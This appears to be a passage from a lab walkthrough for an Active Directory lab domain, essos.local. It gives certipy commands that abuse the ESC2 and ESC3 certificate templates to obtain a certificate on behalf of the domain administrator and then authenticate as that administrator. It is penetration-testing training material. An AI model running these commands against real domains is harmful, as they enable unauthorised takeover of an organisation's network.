Query Cert:
`certipy req -u khal.drogo@essos.local -p 'horse' -target 192.168.56.23 -template ESC2 -ca ESSOS-CA `

Query cert with the Certificate Request Agent certificate we get before (-pfx):
`certipy req -u khal.drogo@essos.local -p 'horse' -target 192.168.56.23 -template User -ca ESSOS-CA -on-behalf-of 'essos\administrator' -pfx khal.drogo.pfx`

Auth:
`certipy auth -pfx administrator.pfx -dc-ip 192.168.56.12`


We also can do the same with the ESC3-CRA and ESC3 templates in the lab :
```

`certipy req -u khal.drogo@essos.local -p 'horse' -target 192.168.56.23 -template ESC3-CRA -ca ESSOS-CA 

certipy req -u khal.drogo@essos.local -p 'horse' -target 192.168.56.23 -template ESC3 -ca ESSOS-CA -on-behalf-of 'essos\administrator' -pfx khal.drogo.pfx 

certipy auth -pfx administrator.pfx -username administrator -domain essos.local -dc-ip 192.168.56.12

```